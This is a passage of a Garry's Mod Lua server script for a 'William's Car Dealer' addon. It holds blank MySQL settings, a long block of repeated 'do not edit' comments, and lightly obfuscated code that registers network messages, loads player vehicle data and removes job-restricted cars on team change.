CarDealer.Settings.MySQL={};
CarDealer.Settings.MySQL.Using=false;
CarDealer.Settings.MySQL.Host="";
CarDealer.Settings.MySQL.User="";
CarDealer.Settings.MySQL.Password="";
CarDealer.Settings.MySQL.Database="";
CarDealer.Settings.MySQL.Port=3306;
CarDealer.Settings.MySQL.Table="cars";



// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT

// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT
// DONT EDIT BELOW THIS LINE
// YOU MIGHT BREAK THE SCRIPT


util.AddNetworkString("CarDealer::Derma")
util.AddNetworkString("CarDealer::Buy")util.AddNetworkString("CarDealer::Sell")
util.AddNetworkString("CarDealer::Spawn")util.AddNetworkString("CarDealer::Update")
util.AddNetworkString("CarDealer::DriverFuel")util.AddNetworkString("CarDealer::TestDrive")
util.AddNetworkString("CarDealer::StartSound")util.AddNetworkString("CarDealer::StopSound")
util.AddNetworkString("CarDealer::Remove")util.AddNetworkString("CarDealer::Groups")
util.AddNetworkString("CarDealerAdmin::Derma")util.AddNetworkString("CarDealerAdmin::Save")
util.AddNetworkString("CarDealerAdmin::SaveFuel")util.AddNetworkString("CarDealerAdmin::Remove")
util.AddNetworkString("CarDealerAdmin::RemoveFuel")
util.AddNetworkString("CarDealerAdmin::RemoveCar")util.AddNetworkString("CarDealerAdmin::GetCars")
util.AddNetworkString("CarDealerAdmin::GiveCar")util.AddNetworkString("CarDealerAdmin::SetGroup")
util.AddNetworkString("CarDealerAdmin::DeleteAll")
util.AddNetworkString("CarDealerAdmin::GetGroups")
util.AddNetworkString("CarDealerAdmin::RemoveGroup")util.AddNetworkString("CarDealerAdmin::AddGroup")
util.AddNetworkString("CarDealerAdmin::DeleteAllGroups")
if(CarDealer.Settings.PassengerMod)then
hook.Add("OnEntityCreated","PassengerModStuff",function(Q)
if(
Q:GetClass()=="prop_vehicle_jeep")then
timer.Simple(2,function()local ZA=false
if(Q.CarOwner)then
local _IQQ=Q.CarOwner;for XpkjA,pVRj in pairs(player.GetAll())do if(_IQQ==pVRj:SteamID64())then
ZA=pVRj;break end end
if
(ZA)then hook.Call("PlayerSpawnedVehicle",nil,ZA,Q)end end end)end end)end;if(not
(CarDealer.Players and type(CarDealer.Players)=="table"))then
CarDealer.Players={}end;local LmcA2auZ
CarDealer.__DB=LmcA2auZ
resource.AddFile("resource/fonts/Roboto-Bold.ttf")
resource.AddFile("resource/fonts/Walkway SemiBold.ttf")
resource.AddFile("resource/fonts/Roboto-Regular.ttf")
resource.AddFile("resource/materials/vgui/wcd/wcdtick.png")resource.AddFile("sound/wcdbtn1.mp3")
resource.AddFile("sound/wcdbtn2.mp3")CarDealer.Data=list.Get("Vehicles")CarDealer.Fuel={}
function CarDealer:Init(fuZ3z86)
if(
CarDealer.__st or CarDealer.__Outdated)then
fuZ3z86:Kick(
"William's Car Dealer is out of date! Quit to prevent losing configuration. Server version: "..VERSIONSTR)end
if
(CarDealer.Players[fuZ3z86:SteamID64()]==nil)then CarDealer.Players[fuZ3z86:SteamID64()]={}end;if
(not IsValid(fuZ3z86)or not fuZ3z86:IsPlayer())then return end
if
(CarDealer.Settings.MySQL.Using)then LmcA2auZ:Get(fuZ3z86)else
CarDealer.Players[fuZ3z86:SteamID64()]=util.JSONToTable(fuZ3z86:GetPData(CarDealer.Settings.MySQL.Table,"{}"))self:UpdateClient(fuZ3z86)end
if
(not CarDealer.Players[fuZ3z86:SteamID64()])then CarDealer.Players[fuZ3z86:SteamID64()]={}end
timer.Simple(45,function()if(not fuZ3z86:IsValid())then return end
local er=util.JSONToTable(fuZ3z86:GetPData("cardealergroups","[]"))fuZ3z86.__GROUPS=er;net.Start("CarDealer::Groups")
net.WriteTable(er)net.Send(fuZ3z86)end)end
hook.Add("OnPlayerChangedTeam","TeamChange::CarRemove",function(DFb100j,XL_,WYdR)
for QKKks_zt,Are7xU in
pairs(ents.FindByClass("prop_vehicle_jeep"))do
if
(
IsValid(Are7xU)and Are7xU.class and Are7xU.class~=nil and Are7xU.CarOwner==DFb100j:SteamID64())then
if
(CarDealer.Cars[Are7xU.class]and
CarDealer.Cars[Are7xU.class].restricted and
CarDealer.Cars[Are7xU.class].restricted.jobs and
type(CarDealer.Cars[Are7xU.class].restricted.jobs)=="table")then
if
(
table.HasValue(CarDealer.Cars[Are7xU.class].restricted.jobs,XL_)and not
table.HasValue(CarDealer.Cars[Are7xU.class].restricted.jobs,WYdR))then
DarkRP.notify(DFb100j,0,5,"Your old vehicle has been removed.")Are7xU:Remove()return end end end end
for yxjl,ZG in pairs(ents.FindByClass("prop_vehicle_jeep_old"))do
if
(
IsValid(ZG)and ZG.class and ZG.class~=nil and ZG.CarOwner==
DFb100j:SteamID64())then
if
(

